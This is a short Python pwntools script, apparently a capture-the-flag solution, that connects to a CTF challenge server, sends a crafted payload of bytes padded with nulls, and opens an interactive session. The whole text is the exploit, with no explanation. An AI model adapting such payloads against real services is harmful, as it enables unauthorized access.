from pwn import *
r = remote("hctf.hackappatoi.com", 10001)
payload = b"a" + b"\0"*31 + b"a" + b"\0"
r.sendline(payload)
r.interactive()